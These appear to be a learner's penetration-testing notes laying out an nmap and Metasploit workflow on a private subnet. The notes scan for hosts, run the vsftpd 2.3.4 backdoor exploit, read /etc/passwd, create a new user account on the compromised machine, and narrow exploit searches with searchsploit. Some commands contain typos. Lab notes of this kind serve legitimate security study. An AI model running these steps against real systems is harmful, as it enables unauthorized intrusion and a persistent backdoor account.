### Metasploite and nmap WorkFlow

1. Step-1: Search the alive devices
`nmap -Sn 192.168.0.1/24`

2. Step-2: Scan the Port and their version
`nmap -Pn -sV <targetIP>`

> [copy the backdated versions]

3. Step-3: Open metasploite framework
`msfconsole`

4. Step-4: search that particular versions exploits [if version is exactly given]
`search vsftpd 2.3.4`

> [exploits will be shown in a table called (matching madules)]
> [copy the exploits or remember the number of that exploit]

> [if any how exact version is not found. just use the vsftpd. all versions exploitations will be shown. Recommended "Excellent"]
[Follow below. if all versions exploitation list is huge]

5. Step-5: use the exploit
`use exploit/unix/ftp/vsftpd_234_backdoor`

6. Step-6: See the required options for that exploit
`show options`

7. Step-7: Set the Target (Configure)

`set RHOSTS 192.168.0.101`
`set RPORT 21`
> [if `show options` say no in the table then no need to set]
> [if port is given already no need to set]

8. Step-8: Check configure again 

`show options`

9. Step-9: Finally Attack the machine, after all configurations

`exploit`

> [if session is created. the successfully, we gained the access]
> [now we can do anything]

10. Step-10: Suppose creating finding and creating a user in the machine
[if meterpreter write: shell]

`hostname`
`whoami`                             [checking loged in user]
`cat /etc/passwd`                    [check users]
`useradd ekhtiar` `passwd ekhtiar`   [creating user]


10. Step-11: loging out
`exit`
------------------------------------------------------------------------------------------------------------------





------------------------------------------------------------------------------------------------------------------
### if Version is not given (nmap can't always find the exact version. Metasploite Framework can find that)
[find the version]

4. Step-4: search the version finding exploit
`search smb_version`

> [for http, http_version]

5. Step-5: use the exploit

`use auxiliary/scanner/smb/smb_version`

6. Step-6: Set target (Configuration)

`set RHOSTS 192.168.0.101`
`set RPORT 139`

7. Step-7: run the version finding exploitation
`run`

> [use the version and continue with the main exploitation]
-------------------------------------------------------------------------------------------------------------------


-------------------------------------------------------------------------------------------------------------------
### if exact version not found. and thousands of verions exploitation exist.
[narrow down the list] [http running in apache server] [find php version of that apache server]

-----in Metasploite
`search type:exploit platform:unix`    [platworm:windows for windows]

[if still large list. use different tools to find exploits]

----in searchexploit

`searchexploit apache 2.2.8 | grep php`

[small list should be shown]
-------------------------------------------------------------------------------------------------------------------



